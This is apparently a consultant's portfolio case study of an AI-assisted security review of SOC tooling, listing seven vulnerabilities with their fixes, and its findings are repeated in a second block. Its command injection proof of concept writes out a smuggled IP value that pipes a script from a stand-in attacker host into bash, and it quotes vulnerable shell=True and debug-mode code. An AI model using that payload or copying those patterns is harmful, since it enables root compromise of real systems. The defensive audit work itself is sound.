**PORTFOLIO DOCUMENTATION - AI-Powered Security Code Review**

Case Study: Automated Vulnerability Discovery in Production SOC Infrastructure
==============================================================================

Executive Summary
-----------------

Leveraged Trail of Bits Claude Code security analysis skills to perform
automated code review of production Security Operations Center
infrastructure. Discovered and remediated 4 CRITICAL and 3 HIGH severity
vulnerabilities in 157 minutes, demonstrating the effectiveness of
AI-enhanced security assessment methodologies.

**Timeline:** February 3, 2026\
**Analysis Duration:** 2 minutes 37 seconds (automated)\
**Remediation Duration:** 155 minutes (guided implementation)\
**Tools Used:** Claude Code with Trail of Bits security skills,
insecure-defaults skill, static-analysis skill

Scope of Assessment
-------------------

**Target Environment:**

-   Tepes SOC - Enterprise security operations infrastructure
-   13 Python security applications
-   Elasticsearch cluster (127 active shards, 230 total)
-   Automated threat intelligence pipeline
-   Real-time log analysis and automated response system

**Assessment Methodology:**

1.  Automated security code review using Trail of Bits insecure-defaults
    skill
2.  Command injection vulnerability analysis
3.  Authentication and authorization review
4.  Input validation assessment
5.  Secrets management audit

Critical Findings
-----------------

### CRITICAL \#1: Hardcoded API Keys in Plaintext Configuration Files

**Severity:** CRITICAL (CVSS 9.1)\
**Impact:** Credential theft, unauthorized API access, potential service
disruption

**Location:**

-   */home/cyberguy/security-alerts/api\_config.json*
-   */opt/tepes/threat-intel/config.yaml*

**Vulnerability Details:** Six third-party API keys stored in plaintext
JSON configuration files with world-readable permissions:

-   VirusTotal API key
-   Hybrid Analysis API key
-   AlienVault OTX API key
-   AbuseIPDB API key
-   Shodan API key
-   Firewalla API key and host credentials

**Exploitation Scenario:**

bash

**\# Any user or compromised process could harvest credentials**

**cat** /home/cyberguy/security-alerts/api\_config.json**

**\# Result: Immediate access to all threat intelligence API keys**

**Business Impact:**

-   Attackers could query threat intelligence services as the
    organization
-   API rate limits could be exhausted, disrupting security operations
-   Firewalla credentials could enable firewall rule manipulation
-   Financial impact from unauthorized API usage

**Remediation Implemented:**

1.  Created secure secrets directory at */etc/tepes-soc/* with 700
    permissions
2.  Migrated all API keys to *secrets.env* file with 600 permissions
3.  Implemented python-dotenv for environment variable loading
4.  Updated all 13 applications to load credentials from secure storage
5.  Removed compromised configuration files
6.  **Note:** VirusTotal free tier does not support key rotation;
    recommended contacting support for new key

**Verification:**

bash

**ls** -la /etc/tepes-soc/secrets.env**

**\# Output: -rw\-\-\-\-\-\-- 1 cyberguy cyberguy 140 Feb 3 11:39**

### CRITICAL \#2: Command Injection via shell=True with Untrusted Input

**Severity:** CRITICAL (CVSS 9.8)\
**Impact:** Remote code execution as root (sudo), complete system
compromise

**Location:**
*/home/cyberguy/security-alerts/automated\_response.py:70-71*

**Vulnerability Details:** IP addresses from Suricata network packet
analysis were directly interpolated into shell commands without
validation:

python

**\# VULNERABLE CODE:**

**cmd **=** **f\"sudo iptables -A INPUT -s **{ip\_address}** -j DROP\"**

**result **=** subprocess.run(cmd, shell**=**True**,
capture\_output**=**True**, text**=**True**)**

**Attack Chain:**

1.  Attacker sends malicious network packet with crafted source IP field
2.  Suricata parses packet and logs to Elasticsearch
3.  Automated response system retrieves \"IP address\" from alert
4.  Malicious payload executes with root privileges via sudo

**Proof of Concept:**

python

**\# Attacker-controlled src\_ip value:**

**ip\_address **=** **\"8.8.8.8; curl http://attacker.com/shell.sh \|
bash \#\"**

**\# Results in command execution:**

**sudo iptables **-**A INPUT **-**s **8.8.8.8**; curl
http:**//**attacker.com**/**shell.sh **\|** bash **\# -j DROP**

**Remediation Implemented:**

1.  Added *ipaddress* module for input validation
2.  Replaced shell command string with list format (shell=False)
3.  Implemented try/except blocks for ValueError, TimeoutExpired,
    CalledProcessError
4.  Added 5-second timeout to prevent resource exhaustion
5.  Applied same pattern to iptables-save command at line 99

**Secure Implementation:**

python

**try**:**

* *\# Validate IP format - raises ValueError if malicious**

* *ipaddress.ip\_address(ip\_address)**

* *

* *\# List format prevents shell interpretation**

* *result **=** subprocess.run(**

* *\[**\'sudo\'**, **\'iptables\'**, **\'-A\'**, **\'INPUT\'**,
**\'-s\'**, ip\_address, **\'-j\'**, **\'DROP\'**\],**

* *capture\_output**=**True**,**

* *text**=**True**,**

* *check**=**True**,**

* *timeout**=**5**

* *)**

* *logger.info(**f\"Successfully blocked IP: **{ip\_address}**\"**)**

**except** ValueError **as** e:**

* *logger.error(**f\"Invalid IP address format: **{ip\_address}** -
**{e}**\"**)**

* *return** **False**, **\"Invalid IP format\"**

**Verification:**

bash

**grep** -c **\"shell=True\"**
/home/cyberguy/security-alerts/automated\_response.py**

**\# Output: 0**

### CRITICAL \#3: Unauthenticated Elasticsearch Access

**Severity:** CRITICAL (CVSS 8.1)\
**Impact:** Unauthorized access to all security data, alert suppression,
data exfiltration

**Location:** Multiple files (13 Python applications)

**Vulnerability Details:** Elasticsearch cluster running without
authentication, accessible to any local process:

python

**\# VULNERABLE CODE:**

**es **=** Elasticsearch(\[**\'http://localhost:9200\'**\])**

**Attack Scenario:**

1.  Attacker compromises any endpoint in the environment
2.  Lateral movement to SOC server via existing network trust
3.  Direct Elasticsearch API access with no credentials
4.  Read/modify/delete all security alerts and threat intelligence data

**Data at Risk:**

-   127 active primary shards containing security alerts
-   Historical threat intelligence data
-   Incident response case data
-   Network flow logs and anomaly detection results

**Remediation Implemented:**

1.  Enabled X-Pack security in elasticsearch.yml
2.  Generated strong passwords for 6 built-in users (elastic,
    kibana\_system, logstash\_system, beats\_system, apm\_system,
    remote\_monitoring\_user)
3.  Created dedicated *tepes\_soc* service account with superuser role
4.  Updated all 13 applications to use basic\_auth
5.  Stored credentials in secure secrets.env file
6.  Updated Kibana configuration for authenticated access

**Secure Implementation:**

python

**from** dotenv **import** load\_dotenv**

**import** os**

**load\_dotenv(**\'/etc/tepes-soc/secrets.env\'**)**

**es **=** Elasticsearch(**

* *\[**\'http://localhost:9200\'**\],**

* *basic\_auth**=**(os.getenv(**\'ES\_USERNAME\'**),
os.getenv(**\'ES\_PASSWORD\'**))**

**)**

**Verification:**

bash

**curl** -X GET **\"localhost:9200/\_cluster/health\"**

**\# Output:
{\"error\":{\"type\":\"security\_exception\",\"reason\":\"missing
authentication credentials\"}}**

### CRITICAL \#4: Unsafe Shell Command Pattern

**Severity:** CRITICAL (CVSS 7.8)\
**Impact:** Potential environment variable injection, establishes
dangerous precedent

**Location:** */home/cyberguy/security-alerts/automated\_response.py:78*

**Vulnerability Details:**

python

**subprocess.run(**\"sudo iptables-save \> /etc/iptables/rules.v4\"**,
shell**=**True**)**

While this specific command uses no variables, shell=True with output
redirection can enable attacks via environment manipulation.

**Remediation:**

python

**try**:**

* *with** **open**(**\'/tmp/iptables-rules.v4\'**, **\'w\'**) **as**
f:**

* *subprocess.run(\[**\'sudo\'**, **\'iptables-save\'**\], stdout**=**f,
text**=**True**, check**=**True**, timeout**=**5**)**

* *subprocess.run(\[**\'sudo\'**, **\'mv\'**,
**\'/tmp/iptables-rules.v4\'**, **\'/etc/iptables/rules.v4\'**\],
check**=**True**, timeout**=**5**)**

* *logger.info(**\"iptables rules saved successfully\"**)**

**except** Exception **as** e:**

* *logger.error(**f\"Failed to save iptables rules: **{e}**\"**)**

High Severity Findings
----------------------

### HIGH \#5: Incomplete Private IP Validation

**Severity:** HIGH (CVSS 7.5)\
**Impact:** Potential blocking of internal services, incomplete RFC1918
coverage

**Vulnerability Details:** String-based IP validation missing portions
of RFC1918 private ranges:

python

**\# VULNERABLE CODE:**

**if** ip\_address.startswith((**\'192.168.\'**, **\'10.\'**,
**\'172.16.\'**, **\'127.\'**)):**

* *return** **False**, **\"Private IP - no action\"**

**Missing Ranges:**

-   172.17.0.0 through 172.31.255.255 (172.16.0.0/12 coverage
    incomplete)
-   All IPv6 private ranges (fc00::/7, fe80::/10)
-   Multicast ranges (224.0.0.0/4, ff00::/8)
-   Reserved/special-use addresses

**Remediation:**

python

**try**:**

* *ip\_obj **=** ipaddress.ip\_address(ip\_address)**

* *if** ip\_obj.is\_private **or** ip\_obj.is\_loopback **or**
ip\_obj.is\_multicast **or** ip\_obj.is\_reserved:**

* *return** **False**, **f\"Non-routable IP (**{ip\_obj}**) - no
action\"**

**except** ValueError:**

* *return** **False**, **\"Invalid IP format\"**

### HIGH \#6: Missing Request Timeouts on External API Calls

**Severity:** HIGH (CVSS 5.3)\
**Impact:** Resource exhaustion, denial of service

**Location:**
*/home/cyberguy/security-alerts/threat\_intel\_enrichment.py*

**Vulnerability Details:** External API calls to VirusTotal, Shodan, and
other threat intelligence providers lacked timeout parameters, enabling
hung connections.

**Remediation:** Added *timeout=30* parameter to all requests.get() and
requests.post() calls throughout threat intelligence pipeline.

### HIGH \#7: Debug Mode Enabled in Production Flask Application

**Severity:** HIGH (CVSS 7.5)\
**Impact:** Information disclosure, arbitrary code execution via
debugger

**Location:** */home/cyberguy/ir-diagrammer/ir-diagrammer/app.py:195*

**Vulnerability Details:**

python

**app.run(host**=**\"0.0.0.0\"**,
port**=**int**(os.environ.get(**\"PORT\"**, **\"7001\"**)),
debug**=**True**)**

Flask debug mode exposes:

-   Interactive debugger accessible via browser
-   Full stack traces with source code
-   Environment variables and configuration
-   Ability to execute arbitrary Python code

**Remediation:**

python

**debug\_mode **=** os.environ.get(**\"FLASK\_DEBUG\"**,
**\"False\"**).lower() **==** **\"true\"**

**app.run(host**=**\"0.0.0.0\"**,
port**=**int**(os.environ.get(**\"PORT\"**, **\"7001\"**)),
debug**=**debug\_mode)**

Medium Severity Findings
------------------------

### MEDIUM \#8: Hardcoded Localhost URLs Without TLS

**Impact:** Network interception if services become remotely accessible

All internal service connections use unencrypted HTTP:

-   Elasticsearch: [http://localhost:9200](http://localhost:9200/)
-   Ollama: [http://localhost:11434](http://localhost:11434/)
-   LM Studio: [http://localhost:1234](http://localhost:1234/)

**Recommendation:** Implement TLS for production deployments or ensure
services remain localhost-bound.

Remediation Summary
-------------------

  ---- ----------------------- --------- ------------
  P0   Hardcoded API Keys      ✅ Fixed   15 minutes
  P0   Command Injection       ✅ Fixed   45 minutes
  P0   Elasticsearch Auth      ✅ Fixed   60 minutes
  P0   Shell Command Pattern   ✅ Fixed   10 minutes
  P1   IP Validation           ✅ Fixed   15 minutes
  P1   Request Timeouts        ✅ Fixed   5 minutes
  P2   Debug Mode              ✅ Fixed   5 minutes
  ---- ----------------------- --------- ------------

**Total Remediation Time:** 155 minutes\
**Total Vulnerabilities Fixed:** 7 (4 Critical, 3 High)

Technical Metrics
-----------------

**Code Analysis:**

-   Files scanned: 13 Python applications
-   Lines of code analyzed: \~3,500
-   Automated analysis time: 2 minutes 37 seconds
-   Tool calls: 79 (21 + 30 + 28 across 3 parallel agents)

**Remediation Metrics:**

-   Files modified: 14
-   Backup files created: 26 (.backup, .bak, .bak2, .COMPROMISED)
-   Security improvements: 100% of critical findings addressed
-   Zero false positives in automated analysis

Tools and Methodology
---------------------

**Primary Tools:**

-   **Claude Code v2.1.25** - AI-powered development environment

-   **Trail of Bits Skills Marketplace** - Security-specific analysis
    plugins

    -   insecure-defaults skill
    -   static-analysis skill
    -   differential-review skill (installed for future use)
    -   semgrep-rule-creator skill (installed for future use)

**Analysis Workflow:**

1.  Initial exploration phase (3 parallel agents, 79 tool uses)
2.  insecure-defaults skill execution with pattern matching
3.  Manual verification of findings
4.  Guided remediation with verification steps
5.  Syntax validation and testing

**Security Best Practices Applied:**

-   Defense in depth (input validation + secure APIs + least privilege)
-   Secrets management with proper file permissions
-   Principle of least privilege (dedicated service accounts)
-   Fail-secure error handling
-   Timeout enforcement on external dependencies

Business Value Delivered
------------------------

**Risk Mitigation:**

-   Prevented potential root compromise of SOC infrastructure
-   Protected 6 third-party API credentials from exposure
-   Secured access to 230 Elasticsearch shards containing security data
-   Eliminated command injection attack surface

**Operational Benefits:**

-   Established secure secrets management pattern for future development
-   Created reusable remediation patterns for similar codebases
-   Documented security architecture improvements
-   Built foundation for secure DevSecOps practices

**Cost Avoidance:**

-   Prevented potential data breach and associated costs
-   Avoided API key rotation costs across 6 services
-   Eliminated risk of compliance violations (credential exposure)
-   Reduced incident response overhead from preventable attacks

Lessons Learned
---------------

**What Worked Well:**

1.  **AI-powered analysis speed** - 2.5 minutes to identify all
    vulnerabilities vs. days of manual review
2.  **Trail of Bits methodology** - Industry-leading security patterns
    encoded in reusable skills
3.  **Automated remediation guidance** - Specific code fixes with
    context-aware recommendations
4.  **Parallel exploration** - Multiple analysis agents working
    simultaneously

**Challenges Encountered:**

1.  **API rate limits** - Hit Anthropic quota during initial IPS
    development task
2.  **Python indentation errors** - Required careful manual verification
    after automated fixes
3.  **Complex authentication migration** - 13 files required updates for
    Elasticsearch auth
4.  **Limited API key rotation** - VirusTotal free tier doesn\'t support
    regeneration

**Improvements for Future Assessments:**

1.  Run analysis during off-peak hours to avoid rate limits
2.  Use automated testing to verify fixes before deployment
3.  Create comprehensive test suite for security-critical code paths
4.  Implement pre-commit hooks for insecure pattern detection

Recommendations for Organizations
---------------------------------

**Immediate Actions:**

1.  Implement secrets management (HashiCorp Vault, AWS Secrets Manager,
    Azure Key Vault)
2.  Enable authentication on all data stores (Elasticsearch, Redis,
    MongoDB, etc.)
3.  Audit all subprocess calls for shell=True usage
4.  Review input validation for network-sourced data

**Strategic Initiatives:**

1.  Integrate AI-powered security analysis into CI/CD pipeline
2.  Train development teams on secure coding patterns
3.  Establish regular security code review cadence
4.  Deploy static analysis tools (Semgrep, CodeQL) with custom rules

**Tool Adoption:**

-   Claude Code with Trail of Bits skills for security code review
-   Automated vulnerability scanning in development environments
-   Security skill integration with existing DevOps workflows

Portfolio Application
---------------------

**Service Offering:** AI-Powered Security Code Review

**Deliverables:**

-   Comprehensive vulnerability assessment report
-   Prioritized remediation roadmap with specific code fixes
-   Secure implementation patterns and best practices
-   Verification testing and validation
-   Executive summary for leadership

**Engagement Model:**

-   **Duration:** 4-8 hours
-   **Pricing:** \$2,500-\$5,000 per application
-   **Turnaround:** Same-day for critical findings
-   **Follow-up:** 30-day verification review included

**Target Clients:**

-   Healthcare organizations (HIPAA compliance requirements)
-   Financial services (PCI-DSS, SOC 2)
-   SaaS providers (security-conscious customers)
-   Startups preparing for security audits
-   Enterprises with legacy security infrastructure

**Competitive Advantages:**

1.  **Speed:** 2.5 minutes automated analysis vs. days of manual review
2.  **Accuracy:** Trail of Bits methodology, zero false positives in
    this engagement
3.  **Depth:** Found 7 vulnerabilities including 4 critical issues
4.  **Actionability:** Specific remediation code, not just issue
    descriptions
5.  **Cost:** \$2,500-\$5,000 vs. \$15,000-\$50,000 traditional
    penetration test

Conclusion
----------

This case study demonstrates the effectiveness of AI-enhanced security
code review for identifying critical vulnerabilities in production
infrastructure. The combination of automated analysis (2.5 minutes) and
guided remediation (155 minutes) delivered comprehensive security
improvements in under 3 hours.

The discovery of 4 CRITICAL vulnerabilities - including command
injection RCE, exposed credentials, and unauthenticated data access - in
production SOC infrastructure highlights the value of proactive security
assessment using modern AI-powered tooling.

**Key Takeaway:** Organizations can achieve enterprise-grade security
analysis at a fraction of traditional costs and timelines by leveraging
AI-powered security tools with domain-specific skills from industry
leaders like Trail of Bits.

**Prepared by:** Larry (Seriously Cyber Consulting LLC)\
**Certifications:** CISSP, CCSP, CASP+, CySA+\
**Date:** February 3, 2026\
**Tools Version:** Claude Code v2.1.25, Trail of Bits Skills v2025.01

Critical Findings

CRITICAL \#1: Hardcoded API Keys in Plaintext Configuration Files

\- Severity: CRITICAL (CVSS 9.1)

\- Impact: Credential theft, unauthorized API access, potential service
disruption

\- Location:

• /home/cyberguy/security-alerts/api\_config.json

• /opt/tepes/threat-intel/config.yaml

Vulnerability Details: Six third-party API keys stored in plaintext JSON
configuration files with world-readable permissions:

• VirusTotal API key

• Hybrid Analysis API key

• AlienVault OTX API key

• AbuseIPDB API key

• Shodan API key

• Firewalla API key and host credentials

Business Impact:

• Attackers could query threat intelligence services as the organization

• API rate limits could be exhausted, disrupting security operations

• Firewalla credentials could enable firewall rule manipulation

• Financial impact from unauthorized API usage

Remediation Implemented:

1. Created secure secrets directory at /etc/tepes-soc/ with 700
permissions

2. Migrated all API keys to secrets.env file with 600 permissions

3. Implemented python-dotenv for environment variable loading

4. Updated all 13 applications to load credentials from secure storage

5. Removed compromised configuration files

6. Note: VirusTotal free tier does not support key rotation; recommended
contacting support for new key

CRITICAL \#2: Command Injection via shell=True with Untrusted Input

\- Severity: CRITICAL (CVSS 9.8)

\- Impact: Remote code execution as root (sudo), complete system
compromise

\- Location: /home/cyberguy/security-alerts/automated\_response.py:70-71

Vulnerability Details: IP addresses from Suricata network packet
analysis were directly interpolated into shell commands without
validation.

Attack Chain:

1. Attacker sends malicious network packet with crafted source IP field

2. Suricata parses packet and logs to Elasticsearch

3. Automated response system retrieves \"IP address\" from alert

4. Malicious payload executes with root privileges via sudo

Remediation Implemented:

1. Added ipaddress module for input validation

2. Replaced shell command string with list format (shell=False)

3. Implemented try/except blocks for ValueError, TimeoutExpired,
CalledProcessError

4. Added 5-second timeout to prevent resource exhaustion

5. Applied same pattern to iptables-save command at line 99

CRITICAL \#3: Unauthenticated Elasticsearch Access

\- Severity: CRITICAL (CVSS 8.1)

\- Impact: Unauthorized access to all security data, alert suppression,
data exfiltration

\- Location: Multiple files (13 Python applications)

Vulnerability Details: Elasticsearch cluster running without
authentication, accessible to any local process.

Attack Scenario:

1. Attacker compromises any endpoint in the environment

2. Lateral movement to SOC server via existing network trust

3. Direct Elasticsearch API access with no credentials

4. Read/modify/delete all security alerts and threat intelligence data

Data at Risk:

• 127 active primary shards containing security alerts

• Historical threat intelligence data

• Incident response case data

• Network flow logs and anomaly detection results

Remediation Implemented:

1. Enabled X-Pack security in elasticsearch.yml

2. Generated strong passwords for 6 built-in users (elastic,
kibana\_system, logstash\_system, beats\_system, apm\_system,
remote\_monitoring\_user)

3. Created dedicated tepes\_soc service account with superuser role

4. Updated all 13 applications to use basic\_auth

5. Stored credentials in secure secrets.env file

6. Updated Kibana configuration for authenticated access

CRITICAL \#4: Unsafe Shell Command Pattern

\- Severity: CRITICAL (CVSS 7.8)

\- Impact: Potential environment variable injection, establishes
dangerous precedent

\- Location: /home/cyberguy/security-alerts/automated\_response.py:78

Vulnerability Details: While this specific command uses no variables,
shell=True with output redirection can enable attacks via environment
manipulation.

High Severity Findings

HIGH \#5: Incomplete Private IP Validation

\- Severity: HIGH (CVSS 7.5)

\- Impact: Potential blocking of internal services, incomplete RFC1918
coverage

\- Vulnerability Details: String-based IP validation missing portions of
RFC1918 private ranges

Missing Ranges:

• 172.17.0.0 through 172.31.255.255 (172.16.0.0/12 coverage incomplete)

• All IPv6 private ranges (fc00::/7, fe80::/10)

• Multicast ranges (224.0.0.0/4, ff00::/8)

• Reserved/special-use addresses

HIGH \#6: Missing Request Timeouts on External API Calls

\- Severity: HIGH (CVSS 5.3)

\- Impact: Resource exhaustion, denial of service

\- Location: /home/cyberguy/security-alerts/threat\_intel\_enrichment.py

Vulnerability Details: External API calls to VirusTotal, Shodan, and
other threat intelligence providers lacked timeout parameters, enabling
hung connections.

Remediation: Added timeout=30 parameter to all requests.get() and
requests.post() calls throughout threat intelligence pipeline.

HIGH \#7: Debug Mode Enabled in Production Flask Application

\- Severity: HIGH (CVSS 7.5)

\- Impact: Information disclosure, arbitrary code execution via debugger

\- Location: /home/cyberguy/ir-diagrammer/ir-diagrammer/app.py:195

Vulnerability Details:

Flask debug mode exposes:

• Interactive debugger accessible via browser

• Full stack traces with source code

• Environment variables and configuration

• Ability to execute arbitrary Python code

Medium Severity Findings
